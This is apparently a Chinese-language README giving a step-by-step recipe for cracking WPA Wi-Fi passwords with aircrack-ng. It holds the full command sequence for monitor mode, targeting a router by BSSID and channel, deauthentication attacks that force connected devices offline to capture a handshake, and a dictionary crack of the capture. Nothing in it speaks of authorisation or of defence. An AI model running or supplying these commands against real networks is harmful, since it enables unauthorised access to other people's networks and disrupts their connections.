# WIFI_WPACrack

强烈建议安装aircrack-ng 1.2版本的,1.1版本的可以有一些操作差异.

1. 首先,将无线网卡设为监听: 通过ifconfig可以查看到你的无线网卡是不是wlan0.
    sudo airmon-ng start wlan0
  如果提示有错误,一般是需要你执行kill把其它占用wifi网卡的进程Kill掉,按照提示kill就行.
  可执行 airmon-ng check kill 进行快速kill,然后再执行一次上面那个命令.

2. 实时刷新所有加密方式为WPA的所有网络
    sudo airodump-ng -a --encrypt WPA wlan0mon
   其中,bssid为路由器的mac地址,CH为通道,后面需要用到.等到看到有需要的信息后,可以按CTRL+C结束掉.

3. 新窗口,从2中,找到自己需要抓包的路由器的bssid和ch.
    假设bssid为 28:2C:B2:E4:F5:5A,通道为13,则单独显示此路由器的连接信息,如下:
    sudo airodump-ng --bssid 28:2C:B2:E4:F5:5A -c 13 -w hand --ignore-negative-one wlan0mon
    其中的-w为抓到握手包后的保存文件名.

    保持3的窗口不要动.

4. 新窗口,输入下面的命令,作用是让目标路由器和它的连接设备掉线,然后再重连,产生握手动作.
    sudo aireplay-ng -0 10 -a 28:2C:B2:E4:F5:5A -c 90:C1:15:BA:82:FD --ignore-negative-one wlan0mon
    其中-0 10是攻击10次, -a 为目标路由器mac, -c的此时正在连接中的未知设备.

    执行完这个后,请观察3窗口的右上角,是否会提示handshake的字样,如果有,则说明成功抓包.可到当前目录下看看,是否有hand_xx.cap的文件,这个就是抓包文件.

5. 当4后,可关闭之前的窗口了,现在抓到了包,可以慢慢的破解了.
    输入
    sudo aircrack-ng hand_xx.cap -w /home/1.txt
    其中1.txt为密码字典文件,可到网上搜WPA字典下载,很多.
    然后就是漫长的等待,运气好几秒中,运气不好永远都撞不对.................

